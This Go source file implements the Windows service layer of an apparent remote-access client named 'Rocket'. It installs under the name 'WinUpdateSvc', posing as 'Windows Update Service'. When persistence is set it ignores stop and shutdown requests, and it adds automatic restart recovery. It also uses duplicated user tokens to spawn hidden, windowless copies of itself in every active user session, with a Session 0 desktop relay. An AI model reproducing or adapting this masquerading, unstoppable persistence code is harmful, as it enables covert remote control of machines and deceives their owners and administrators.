//go:build windows

package lifecycle

import (
	"Rocket/client/service/desktop"
	"Rocket/client/telemetry"
	"context"
	"errors"
	"fmt"
	"os"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kardianos/service"
	"github.com/kataras/golog"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	ServiceName        = "WinUpdateSvc"
	ServiceDisplayName = "Windows Update Service"
	ServiceDescription = "Manages Windows system updates"
)

const (
	wtsCurrentServerHandle = 0
	exitCodeStillActive    = 259

	// Session event notifications we care about
	notifyForThisSession = 0
	notifyForAllSessions = 1
)

// windowsService implements service.Interface from kardianos/service
type windowsService struct {
	app    Application
	ctx    context.Context
	cancel context.CancelFunc
}

var (
	serviceInstallPathMu    sync.RWMutex
	serviceInstallPath      string
	errNoInteractiveSession = errors.New("no interactive user sessions available")
)

// getServiceInstallPath returns the service install path in a thread-safe manner
func getServiceInstallPath() string {
	serviceInstallPathMu.RLock()
	defer serviceInstallPathMu.RUnlock()
	return serviceInstallPath
}

// setServiceInstallPath sets the service install path if not already set (thread-safe)
func setServiceInstallPath(path string) {
	serviceInstallPathMu.Lock()
	defer serviceInstallPathMu.Unlock()
	if serviceInstallPath == "" {
		serviceInstallPath = path
	}
}

// resilientService runs the SCM control loop with event-driven session management
type resilientService struct {
	app Application
}

// SessionState tracks the desired and actual state of a session's UI process
type SessionState struct {
	sessionID      uint32
	desired        string // "active" or "none"
	actual         string // "running" or "stopped"
	process        *ProcessHandle
	lastLaunchTime time.Time
	launchAttempts int
	launchErrors   []error
	mu             sync.Mutex // Per-session mutex to prevent double-launch races
	launching      bool       // Flag to prevent concurrent launches
}

// ProcessHandle wraps Windows process and job object handles
type ProcessHandle struct {
	processHandle windows.Handle
	jobHandle     windows.Handle
	pid           uint32
	startTime     time.Time
}

var (
	sessionStateMu sync.RWMutex
	sessionStates  = make(map[uint32]*SessionState)

	// Launch retry configuration
	maxLaunchAttempts    = 5
	launchBackoffBase    = 2 * time.Second
	launchBackoffMax     = 60 * time.Second
	launchAttemptsResetT = 30 * time.Second // Reset launch attempts after this duration
)

// Start is called when the service is started
func (ws *windowsService) Start(s service.Service) error {
	golog.Info("service: Start invoked")
	ws.ctx, ws.cancel = context.WithCancel(context.Background())
	go func() {
		for {
			if ws.app != nil {
				if err := ws.app.Run(ws.ctx); err != nil && ws.ctx.Err() == nil {
					golog.Warnf("service app exit: %v", err)
				}
			}
			if ws.ctx.Err() != nil {
				return
			}
			time.Sleep(2 * time.Second)
		}
	}()
	return nil
}

// Stop is called when the service is stopped
func (ws *windowsService) Stop(s service.Service) error {
	golog.Info("service: Stop requested")
	if persistenceAllowed(getServiceInstallPath()) {
		golog.Info("service: stop ignored due to persistence configuration")
		return nil
	}
	if ws.cancel != nil {
		ws.cancel()
	}
	return nil
}

// Execute provides the SCM control loop with event-driven session management
func (rs *resilientService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	accepts := svc.AcceptSessionChange | svc.AcceptPowerEvent | svc.AcceptStop | svc.AcceptShutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	telemetry.LogSessionEvent("service started", 0, map[string]interface{}{
		"install_path": getServiceInstallPath(),
	})

	// Enable Session 0 mode for desktop relay
	desktop.SetSession0Mode(true)

	// Start core application in Session 0 (WebSocket connection)
	go func() {
		for {
			if rs.app != nil {
				telemetry.LogSessionEvent("starting core app in session 0", 0, nil)
				if err := rs.app.Run(ctx); err != nil && ctx.Err() == nil {
					telemetry.LogSessionError("core app exited", 0, err, nil)
				}
			}
			select {
			case <-ctx.Done():
				telemetry.LogSessionEvent("core app shutdown", 0, nil)
				return
			case <-time.After(2 * time.Second):
			}
		}
	}()

	// Start session reconciliation loop (replaces polling)
	go sessionReconciliationLoop(ctx)

	// Perform initial session scan
	go reconcileAllSessions()

	changes <- svc.Status{State: svc.StartPending, Accepts: accepts}
	changes <- svc.Status{State: svc.Running, Accepts: accepts}
	telemetry.LogSessionEvent("service running", 0, nil)

	// SCM event loop
	for c := range r {
		switch c.Cmd {
		case svc.Interrogate:
			changes <- c.CurrentStatus

		case svc.Stop, svc.Shutdown:
			if !persistenceAllowed(getServiceInstallPath()) {
				telemetry.LogSessionEvent("service stopping", 0, map[string]interface{}{
					"reason": "stop request",
				})
				cancel()
				terminateAllSessions()
				changes <- svc.Status{State: svc.StopPending, Accepts: accepts}
				return false, 0
			}
			telemetry.LogSessionEvent("stop request ignored", 0, map[string]interface{}{
				"reason": "persistence enabled",
			})
			changes <- svc.Status{State: svc.Running, Accepts: accepts}

		case svc.SessionChange:
			handleSessionChangeEvent(c.EventType, uint32(c.EventData))
			changes <- c.CurrentStatus

		case svc.PowerEvent:
			telemetry.LogSessionEvent("power event", 0, map[string]interface{}{
				"event_type": c.EventType,
			})
			changes <- c.CurrentStatus

		default:
			changes <- c.CurrentStatus
		}
	}

	cancel()
	terminateAllSessions()
	return false, 0
}

// handleSessionChangeEvent processes Windows session change notifications
func handleSessionChangeEvent(eventType uint32, sessionID uint32) {
	defer func() {
		if r := recover(); r != nil {
			telemetry.LogSessionError("handleSessionChangeEvent panic recovered", sessionID, fmt.Errorf("%v", r), map[string]interface{}{
				"event_type": eventType,
			})
		}
	}()

	eventName := sessionEventName(eventType)

	// Fix label cardinality: use event name only, not session_id
	telemetry.SessionEventsTotal.WithLabelValues(eventName, "all").Inc()
	telemetry.LogSessionEvent("session change", sessionID, map[string]interface{}{
		"event": eventName,
	})

	switch eventType {
	case windows.WTS_SESSION_LOGON, windows.WTS_SESSION_UNLOCK, windows.WTS_CONSOLE_CONNECT, windows.WTS_REMOTE_CONNECT:
		// User became active - launch UI
		telemetry.LogSessionEvent("handleSessionChangeEvent: user active event", sessionID, map[string]interface{}{
			"event": eventName,
		})
		// Reset launch attempts on session activation events - user is actively using the session
		resetSessionLaunchAttempts(sessionID)
		setSessionDesiredState(sessionID, "active")
		// Update active session for desktop relay
		desktop.SetActiveSessionID(sessionID)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					telemetry.LogSessionError("reconcileSession panic", sessionID, fmt.Errorf("%v", r), nil)
				}
			}()
			reconcileSession(sessionID)
		}()

	case windows.WTS_SESSION_LOGOFF, windows.WTS_SESSION_TERMINATE, windows.WTS_SESSION_LOCK, windows.WTS_CONSOLE_DISCONNECT, windows.WTS_REMOTE_DISCONNECT:
		// User became inactive - terminate UI
		telemetry.LogSessionEvent("handleSessionChangeEvent: user inactive event", sessionID, map[string]interface{}{
			"event": eventName,
		})
		// Reset launch attempts when session becomes inactive - fresh start next time
		resetSessionLaunchAttempts(sessionID)
		setSessionDesiredState(sessionID, "none")
		desktop.SetActiveSessionID(0)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					telemetry.LogSessionError("reconcileSession panic", sessionID, fmt.Errorf("%v", r), nil)
				}
			}()
			reconcileSession(sessionID)
		}()
	}
}

// sessionReconciliationLoop periodically reconciles session states
// This provides a safety net in case events are missed
// Runs every 10 seconds (reduced from 30s for faster recovery)
func sessionReconciliationLoop(ctx context.Context) {
	defer func() {
		if r := recover(); r != nil {
			telemetry.LogSessionEvent("reconciliation loop panic recovered", 0, map[string]interface{}{
				"panic": fmt.Sprintf("%v", r),
			})
			// Restart the loop
			go sessionReconciliationLoop(ctx)
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			reconcileAllSessions()
		}
	}
}

// reconcileAllSessions scans all sessions and reconciles their states
func reconcileAllSessions() {
	sessionStateMu.Lock()
	defer sessionStateMu.Unlock()

	// Get current active session
	activeSessionID, err := getInteractiveSessionID()
	if err != nil {
		// No active sessions - mark all as desired=none
		desktop.SetActiveSessionID(0)
		for sid := range sessionStates {
			sessionStates[sid].desired = "none"
		}
		telemetry.LogSessionEvent("reconcileAllSessions: no active sessions", 0, map[string]interface{}{
			"error": err.Error(),
		})
	} else {
		telemetry.LogSessionEvent("reconcileAllSessions: found active session", activeSessionID, nil)
		desktop.SetActiveSessionID(activeSessionID)

		// Mark active session as desired=active, others as desired=none
		for sid := range sessionStates {
			if sid == activeSessionID {
				oldDesired := sessionStates[sid].desired
				oldActual := sessionStates[sid].actual
				sessionStates[sid].desired = "active"
				telemetry.LogSessionEvent("reconcileAllSessions: marking session active", sid, map[string]interface{}{
					"old_desired": oldDesired,
					"new_desired": "active",
					"actual":      oldActual,
				})
			} else {
				sessionStates[sid].desired = "none"
			}
		}

		// Ensure active session has a state entry
		if _, exists := sessionStates[activeSessionID]; !exists {
			sessionStates[activeSessionID] = &SessionState{
				sessionID: activeSessionID,
				desired:   "active",
				actual:    "stopped",
			}
			telemetry.LogSessionEvent("reconcileAllSessions: created new active session state", activeSessionID, map[string]interface{}{
				"desired": "active",
				"actual":  "stopped",
			})
		}
	}

	// Time-based reset of launch attempts - allow retry after launchAttemptsResetT
	now := time.Now()
	for sid, state := range sessionStates {
		if state.launchAttempts >= maxLaunchAttempts && state.desired == "active" && state.actual == "stopped" {
			timeSinceLastLaunch := now.Sub(state.lastLaunchTime)
			if timeSinceLastLaunch >= launchAttemptsResetT {
				telemetry.LogSessionEvent("reconcileAllSessions: time-based reset of launch attempts", sid, map[string]interface{}{
					"old_attempts":           state.launchAttempts,
					"time_since_last_launch": timeSinceLastLaunch.Seconds(),
				})
				state.launchAttempts = 0
				state.launchErrors = nil
			}
		}
	}

	// Reconcile each session
	for sid := range sessionStates {
		go reconcileSession(sid)
	}
}

// reconcileSession reconciles a single session's actual state to match desired state
func reconcileSession(sessionID uint32) {
	sessionStateMu.Lock()
	state, exists := sessionStates[sessionID]
	if !exists {
		state = &SessionState{
			sessionID: sessionID,
			desired:   "none",
			actual:    "stopped",
		}
		sessionStates[sessionID] = state
		telemetry.LogSessionEvent("reconcileSession: created new state", sessionID, map[string]interface{}{
			"desired": state.desired,
			"actual":  state.actual,
		})
	}
	sessionStateMu.Unlock()

	// Check if reconciliation is needed
	sessionStateMu.RLock()
	desired := state.desired
	actual := state.actual
	sessionStateMu.RUnlock()

	telemetry.LogSessionEvent("reconcileSession: checking state", sessionID, map[string]interface{}{
		"desired": desired,
		"actual":  actual,
	})

	if desired == actual || (desired == "active" && actual == "running") || (desired == "none" && actual == "stopped") {
		// Already in sync
		telemetry.LogSessionEvent("reconcileSession: states match, no action needed", sessionID, map[string]interface{}{
			"state": desired,
		})
		return
	}

	if desired == "active" && actual == "stopped" {
		// Launch UI process
		telemetry.LogSessionEvent("reconcileSession: will launch UI", sessionID, map[string]interface{}{
			"desired": desired,
			"actual":  actual,
		})
		launchUIInSession(sessionID)
	} else if desired == "none" && actual == "running" {
		// Terminate UI process
		telemetry.LogSessionEvent("reconcileSession: will terminate UI", sessionID, map[string]interface{}{
			"desired": desired,
			"actual":  actual,
		})
		terminateUIInSession(sessionID)
	} else if desired == "active" && actual == "running" {
		// Normal state - UI is running as expected, nothing to do
		// Only log at debug level to avoid spamming
	} else if desired == "none" && actual == "stopped" {
		// Normal state - session is inactive and no UI running, nothing to do
	} else {
		telemetry.LogSessionEvent("reconcileSession: unexpected state combination", sessionID, map[string]interface{}{
			"desired": desired,
			"actual":  actual,
		})
	}
}

// setSessionDesiredState updates the desired state of a session
func setSessionDesiredState(sessionID uint32, desired string) {
	sessionStateMu.Lock()
	defer sessionStateMu.Unlock()

	if state, exists := sessionStates[sessionID]; exists {
		oldDesired := state.desired
		state.desired = desired
		telemetry.LogSessionEvent("setSessionDesiredState: updated existing", sessionID, map[string]interface{}{
			"old_desired": oldDesired,
			"new_desired": desired,
			"actual":      state.actual,
		})
	} else {
		sessionStates[sessionID] = &SessionState{
			sessionID: sessionID,
			desired:   desired,
			actual:    "stopped",
		}
		telemetry.LogSessionEvent("setSessionDesiredState: created new", sessionID, map[string]interface{}{
			"desired": desired,
			"actual":  "stopped",
		})
	}
}

// resetSessionLaunchAttempts resets the launch attempt counter for a session.
// This should be called when session activation events occur (logon, unlock, etc.)
// to allow retrying UI launch after previous failures.
func resetSessionLaunchAttempts(sessionID uint32) {
	sessionStateMu.Lock()
	defer sessionStateMu.Unlock()

	if state, exists := sessionStates[sessionID]; exists {
		if state.launchAttempts > 0 {
			telemetry.LogSessionEvent("resetSessionLaunchAttempts: resetting counter", sessionID, map[string]interface{}{
				"old_attempts": state.launchAttempts,
			})
			state.launchAttempts = 0
			state.launchErrors = nil
		}
	}
}

// launchUIInSession launches the UI process in a user session with Job Object tracking
func launchUIInSession(sessionID uint32) {
	defer func() {
		if r := recover(); r != nil {
			telemetry.LogSessionError("launch panic recovered", sessionID, fmt.Errorf("%v", r), nil)
		}
	}()

	sessionStateMu.Lock()
	state := sessionStates[sessionID]
	sessionStateMu.Unlock()

	// Per-session mutex to prevent double-launch races
	state.mu.Lock()
	defer state.mu.Unlock()

	// Check if already launching
	if state.launching {
		telemetry.LogSessionEvent("launch already in progress", sessionID, nil)
		return
	}

	// Check if already running
	if state.actual == "running" && state.process != nil && isProcessRunning(state.process) {
		telemetry.LogSessionEvent("UI already running", sessionID, map[string]interface{}{
			"pid": state.process.pid,
		})
		return
	}

	// Mark as launching
	state.launching = true
	defer func() { state.launching = false }()

	// Check launch attempts and backoff
	if state.launchAttempts >= maxLaunchAttempts {
		telemetry.LogSessionError("max launch attempts reached", sessionID, nil, map[string]interface{}{
			"attempts": state.launchAttempts,
			"errors":   fmt.Sprintf("%v", state.launchErrors),
		})
		telemetry.SessionLaunchesTotal.WithLabelValues("max_attempts_exceeded").Inc()
		return
	}

	// Apply backoff if this is a retry
	if state.launchAttempts > 0 {
		backoff := calculateBackoff(state.launchAttempts, launchBackoffBase, launchBackoffMax)
		timeSinceLastLaunch := time.Since(state.lastLaunchTime)
		if timeSinceLastLaunch < backoff {
			waitTime := backoff - timeSinceLastLaunch
			telemetry.LogSessionEvent("launch backoff", sessionID, map[string]interface{}{
				"wait_seconds": waitTime.Seconds(),
				"attempt":      state.launchAttempts,
			})
			time.Sleep(waitTime)
		}
	}

	startTime := time.Now()
	state.lastLaunchTime = startTime
	state.launchAttempts++

	telemetry.LogSessionEvent("launching UI", sessionID, map[string]interface{}{
		"attempt":      state.launchAttempts,
		"install_path": getServiceInstallPath(),
	})

	// Get user token for session with retry logic (handles race conditions)
	token, err := queryUserTokenWithRetry(sessionID, 3, 1*time.Second)
	if err != nil {
		errno, ok := err.(syscall.Errno)
		if ok && (errno == windows.ERROR_NO_TOKEN || errno == 1312) {
			telemetry.LogSessionError("no user token after retries", sessionID, err, map[string]interface{}{
				"errno": errno,
			})
			state.launchErrors = append(state.launchErrors, err)
			telemetry.SessionLaunchesTotal.WithLabelValues("no_token").Inc()
			return
		}
		telemetry.LogSessionError("token query failed after retries", sessionID, err, nil)
		state.launchErrors = append(state.launchErrors, err)
		telemetry.SessionLaunchesTotal.WithLabelValues("token_error").Inc()
		return
	}
	defer token.Close()

	// Duplicate token
	var primaryToken windows.Token
	if err := windows.DuplicateTokenEx(
		token,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&primaryToken,
	); err != nil {
		telemetry.LogSessionError("token duplicate failed", sessionID, err, nil)
		state.launchErrors = append(state.launchErrors, err)
		telemetry.SessionLaunchesTotal.WithLabelValues("duplicate_error").Inc()
		return
	}
	defer primaryToken.Close()

	// Create Job Object for clean process management
	jobHandle, err := windows.CreateJobObject(nil, nil)
	if err != nil {
		telemetry.LogSessionError("job object creation failed", sessionID, err, nil)
		state.launchErrors = append(state.launchErrors, err)
		telemetry.SessionLaunchesTotal.WithLabelValues("job_error").Inc()
		return
	}

	// Configure job: terminate all processes when job closes
	var info windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
	info.BasicLimitInformation.LimitFlags = windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE

	infoSize := uint32(unsafe.Sizeof(info))
	_, err = windows.SetInformationJobObject(
		jobHandle,
		windows.JobObjectExtendedLimitInformation,
		uintptr(unsafe.Pointer(&info)),
		infoSize,
	)
	if err != nil {
		windows.CloseHandle(jobHandle)
		telemetry.LogSessionError("job configuration failed", sessionID, err, nil)
		state.launchErrors = append(state.launchErrors, err)
		telemetry.SessionLaunchesTotal.WithLabelValues("job_config_error").Inc()
		return
	}

	// Build command line
	exePath := getServiceInstallPath()
	if exePath == "" {
		exePath, _ = os.Executable()
	}
	exePathUTF16, _ := syscall.UTF16PtrFromString(exePath)
	cmdLineStr := "\"" + exePath + "\" --ui-only"
	cmdLine, _ := syscall.UTF16PtrFromString(cmdLineStr)

	// Launch process
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Desktop, _ = syscall.UTF16PtrFromString("winsta0\\default")
	si.ShowWindow = windows.SW_HIDE

	if err := windows.CreateProcessAsUser(
		primaryToken,
		exePathUTF16,
		cmdLine,
		nil,
		nil,
		false,
		windows.CREATE_NO_WINDOW|windows.NORMAL_PRIORITY_CLASS|windows.CREATE_SUSPENDED, // CREATE_SUSPENDED to assign to job first; avoid console window
		nil,
		nil,
		&si,
		&pi,
	); err != nil {
		windows.CloseHandle(jobHandle)
		telemetry.LogSessionError("process creation failed", sessionID, err, nil)
		state.launchErrors = append(state.launchErrors, err)
		telemetry.SessionLaunchesTotal.WithLabelValues("create_process_error").Inc()
		return
	}

	// Assign process to job object
	if err := windows.AssignProcessToJobObject(jobHandle, pi.Process); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(jobHandle)
		telemetry.LogSessionError("job assignment failed", sessionID, err, nil)
		state.launchErrors = append(state.launchErrors, err)
		telemetry.SessionLaunchesTotal.WithLabelValues("job_assign_error").Inc()
		return
	}

	// Resume process
	windows.ResumeThread(pi.Thread)
	windows.CloseHandle(pi.Thread)

	// Update state
	sessionStateMu.Lock()
	state.actual = "running"
	state.process = &ProcessHandle{
		processHandle: pi.Process,
		jobHandle:     jobHandle,
		pid:           pi.ProcessId,
		startTime:     time.Now(),
	}
	state.launchErrors = nil // Clear errors on success
	sessionStateMu.Unlock()

	launchDuration := time.Since(startTime)
	telemetry.SessionLaunchDuration.Observe(launchDuration.Seconds())
	telemetry.SessionLaunchesTotal.WithLabelValues("success").Inc()
	telemetry.GetHealth().SetUIProcess(true, sessionID, pi.ProcessId)

	telemetry.LogSessionEvent("UI launched successfully", sessionID, map[string]interface{}{
		"pid":             pi.ProcessId,
		"launch_duration": launchDuration.Seconds(),
		"launch_attempts": state.launchAttempts,
	})

	// Monitor process exit in background
	go monitorProcess(sessionID, state.process)
}

// terminateUIInSession terminates the UI process in a session
func terminateUIInSession(sessionID uint32) {
	sessionStateMu.Lock()
	state, exists := sessionStates[sessionID]
	if !exists || state.actual != "running" || state.process == nil {
		sessionStateMu.Unlock()
		return
	}
	process := state.process
	state.actual = "stopped"
	state.process = nil
	sessionStateMu.Unlock()

	telemetry.LogSessionEvent("terminating UI", sessionID, map[string]interface{}{
		"pid": process.pid,
	})

	// Close job handle - this terminates all processes in the job
	windows.CloseHandle(process.jobHandle)
	windows.CloseHandle(process.processHandle)

	telemetry.GetHealth().SetUIProcess(false, sessionID, 0)
	telemetry.LogSessionEvent("UI terminated", sessionID, map[string]interface{}{
		"pid": process.pid,
	})
}

// terminateAllSessions terminates UI processes in all sessions
func terminateAllSessions() {
	sessionStateMu.Lock()
	sessionIDs := make([]uint32, 0, len(sessionStates))
	for sid := range sessionStates {
		sessionIDs = append(sessionIDs, sid)
	}
	sessionStateMu.Unlock()

	for _, sid := range sessionIDs {
		terminateUIInSession(sid)
	}
}

// monitorProcess monitors a process and updates state when it exits
func monitorProcess(sessionID uint32, process *ProcessHandle) {
	defer func() {
		if r := recover(); r != nil {
			telemetry.LogSessionError("monitorProcess panic recovered", sessionID, fmt.Errorf("%v", r), nil)
		}

		// Ensure handles are closed even on panic
		if process.jobHandle != 0 {
			windows.CloseHandle(process.jobHandle)
		}
		if process.processHandle != 0 {
			windows.CloseHandle(process.processHandle)
		}
	}()

	// Wait for process to exit
	windows.WaitForSingleObject(process.processHandle, windows.INFINITE)

	// Get exit code
	var exitCode uint32
	windows.GetExitCodeProcess(process.processHandle, &exitCode)

	sessionStateMu.Lock()
	state := sessionStates[sessionID]
	if state != nil && state.process == process {
		state.actual = "stopped"
		state.process = nil
	}
	sessionStateMu.Unlock()

	telemetry.GetHealth().SetUIProcess(false, sessionID, 0)

	// Close handles explicitly
	windows.CloseHandle(process.jobHandle)
	windows.CloseHandle(process.processHandle)
	process.jobHandle = 0
	process.processHandle = 0

	// Check if desired state is still active
	sessionStateMu.RLock()
	desired := state.desired
	sessionStateMu.RUnlock()

	if exitCode != 0 {
		telemetry.UIProcessCrashesTotal.Inc()
		telemetry.LogSessionEvent("UI process exited unexpectedly", sessionID, map[string]interface{}{
			"pid":       process.pid,
			"exit_code": exitCode,
			"runtime":   time.Since(process.startTime).Seconds(),
		})

		// Retry launch if desired state is still active
		if desired == "active" {
			telemetry.UIProcessRestarts.Inc()
			telemetry.LogSessionEvent("scheduling UI restart after crash", sessionID, nil)
			time.Sleep(5 * time.Second) // Brief delay before retry
			go func() {
				defer func() {
					if r := recover(); r != nil {
						telemetry.LogSessionError("reconcileSession restart panic", sessionID, fmt.Errorf("%v", r), nil)
					}
				}()
				reconcileSession(sessionID)
			}()
		}
	} else {
		telemetry.LogSessionEvent("UI process exited normally", sessionID, map[string]interface{}{
			"pid":     process.pid,
			"runtime": time.Since(process.startTime).Seconds(),
		})

		// Normal exit (exit code 0) - reset launch attempts since this was intentional
		// and schedule a retry if desired state is still active
		sessionStateMu.Lock()
		if state != nil {
			state.launchAttempts = 0
			state.launchErrors = nil
		}
		sessionStateMu.Unlock()

		if desired == "active" {
			telemetry.LogSessionEvent("scheduling UI restart after normal exit", sessionID, nil)
			time.Sleep(2 * time.Second) // Brief delay before retry
			go func() {
				defer func() {
					if r := recover(); r != nil {
						telemetry.LogSessionError("reconcileSession restart panic", sessionID, fmt.Errorf("%v", r), nil)
					}
				}()
				reconcileSession(sessionID)
			}()
		}
	}
}

// isProcessRunning checks if a process is still running
func isProcessRunning(process *ProcessHandle) bool {
	var exitCode uint32
	err := windows.GetExitCodeProcess(process.processHandle, &exitCode)
	return err == nil && exitCode == exitCodeStillActive
}

// calculateBackoff calculates exponential backoff with cap
func calculateBackoff(attempt int, base, max time.Duration) time.Duration {
	backoff := base * time.Duration(1<<uint(attempt-1))
	if backoff > max {
		backoff = max
	}
	return backoff
}

// getInteractiveSessionID returns the active console session ID
func getInteractiveSessionID() (uint32, error) {
	var sessions *windows.WTS_SESSION_INFO
	var count uint32
	if err := windows.WTSEnumerateSessions(windows.Handle(wtsCurrentServerHandle), 0, 1, &sessions, &count); err != nil {
		return 0, err
	}
	defer windows.WTSFreeMemory(uintptr(unsafe.Pointer(sessions)))

	if count == 0 {
		return 0, errNoInteractiveSession
	}

	sessionSlice := unsafe.Slice((*windows.WTS_SESSION_INFO)(unsafe.Pointer(sessions)), int(count))

	// First pass: look for active sessions only
	for _, s := range sessionSlice {
		if s.State == windows.WTSActive && s.SessionID != 0 {
			return s.SessionID, nil
		}
	}

	// Second pass: look for connected sessions
	for _, s := range sessionSlice {
		if s.State == windows.WTSConnected && s.SessionID != 0 {
			return s.SessionID, nil
		}
	}

	return 0, errNoInteractiveSession
}

// sessionEventName returns human-readable name for session event type
func sessionEventName(eventType uint32) string {
	switch eventType {
	case windows.WTS_CONSOLE_CONNECT:
		return "ConsoleConnect"
	case windows.WTS_CONSOLE_DISCONNECT:
		return "ConsoleDisconnect"
	case windows.WTS_REMOTE_CONNECT:
		return "RemoteConnect"
	case windows.WTS_REMOTE_DISCONNECT:
		return "RemoteDisconnect"
	case windows.WTS_SESSION_LOGON:
		return "SessionLogon"
	case windows.WTS_SESSION_LOGOFF:
		return "SessionLogoff"
	case windows.WTS_SESSION_LOCK:
		return "SessionLock"
	case windows.WTS_SESSION_UNLOCK:
		return "SessionUnlock"
	case windows.WTS_SESSION_REMOTE_CONTROL:
		return "RemoteControl"
	case windows.WTS_SESSION_CREATE:
		return "SessionCreate"
	case windows.WTS_SESSION_TERMINATE:
		return "SessionTerminate"
	default:
		return fmt.Sprintf("Event(%d)", eventType)
	}
}

// RunAsService runs the application as a Windows service
func RunAsService(app Application) error {
	if exe, err := os.Executable(); err == nil {
		setServiceInstallPath(exe)
	}
	isService, err := svc.IsWindowsService()
	if err != nil {
		golog.Warnf("svc.IsWindowsService failed: %v", err)
	}
	if isService {
		golog.Info("running under SCM - entering service loop")
		return svc.Run(ServiceName, &resilientService{app: app})
	}
	golog.Info("running in interactive mode, starting application directly")
	return app.Run(context.Background())
}

// WindowsServiceController implements ServiceController for Windows
type WindowsServiceController struct {
	execPath string
}

// NewServiceController creates a new Windows service controller
func NewServiceController(execPath string) *WindowsServiceController {
	setServiceInstallPath(execPath)
	return &WindowsServiceController{execPath: execPath}
}

// Install registers the service with Windows
func (w *WindowsServiceController) Install() error {
	cfg := &service.Config{
		Name:        ServiceName,
		DisplayName: ServiceDisplayName,
		Description: ServiceDescription,
		Executable:  w.execPath,
		Option: service.KeyValue{
			"StartType":                    "automatic",
			service.OnFailure:              service.OnFailureRestart,
			service.OnFailureDelayDuration: "5s",
			service.OnFailureResetPeriod:   60,
		},
	}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	if err := svc.Install(); err != nil {
		return err
	}
	setRecoveryActions()
	return nil
}

// Uninstall removes the service from Windows
func (w *WindowsServiceController) Uninstall() error {
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	return svc.Uninstall()
}

// Start starts the service
func (w *WindowsServiceController) Start() error {
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	return svc.Start()
}

// Stop stops the service
func (w *WindowsServiceController) Stop() error {
	if persistenceAllowed(getServiceInstallPath()) {
		return nil
	}
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	return svc.Stop()
}

// Status returns the current service status
func (w *WindowsServiceController) Status() (string, error) {
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return "unknown", err
	}
	status, err := svc.Status()
	if err != nil {
		return "unknown", err
	}
	switch status {
	case service.StatusRunning:
		return "running", nil
	case service.StatusStopped:
		return "stopped", nil
	default:
		return "unknown", nil
	}
}

// setRecoveryActions configures multi-step restart recovery on failure
func setRecoveryActions() {
	m, err := mgr.Connect()
	if err != nil {
		return
	}
	defer m.Disconnect()
	s, err := m.OpenService(ServiceName)
	if err != nil {
		return
	}
	defer s.Close()
	actions := []mgr.RecoveryAction{
		{Type: mgr.ServiceRestart, Delay: 5 * time.Second},
		{Type: mgr.ServiceRestart, Delay: 10 * time.Second},
		{Type: mgr.ServiceRestart, Delay: 30 * time.Second},
	}
	_ = s.SetRecoveryActions(actions, 120)
	_ = s.SetRecoveryActionsOnNonCrashFailures(true)
}

// queryUserTokenWithRetry attempts to get user token with retries
// Handles race conditions where session is transitioning between states
func queryUserTokenWithRetry(sessionID uint32, maxAttempts int, delay time.Duration) (windows.Token, error) {
	var token windows.Token
	var lastErr error

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		err := windows.WTSQueryUserToken(sessionID, &token)
		if err == nil {
			// Success
			if attempt > 1 {
				telemetry.LogSessionEvent("token query succeeded on retry", sessionID, map[string]interface{}{
					"attempt": attempt,
				})
			}
			return token, nil
		}

		lastErr = err

		// Check if it's a retryable error
		errno, ok := err.(syscall.Errno)
		if !ok {
			// Not a syscall error, don't retry
			return 0, err
		}

		// ERROR_NO_TOKEN (1008) and ERROR_NO_SUCH_LOGON_SESSION (1312) are retryable
		if errno != windows.ERROR_NO_TOKEN && errno != 1312 {
			// Other errors are not retryable
			return 0, err
		}

		// Log retry attempt
		if attempt < maxAttempts {
			telemetry.LogSessionEvent("token query failed, retrying", sessionID, map[string]interface{}{
				"attempt":  attempt,
				"errno":    errno,
				"delay_ms": delay.Milliseconds(),
			})
			time.Sleep(delay)
		}
	}

	// All attempts exhausted
	telemetry.LogSessionError("token query failed after all retries", sessionID, lastErr, map[string]interface{}{
		"attempts": maxAttempts,
	})
	return 0, lastErr
}
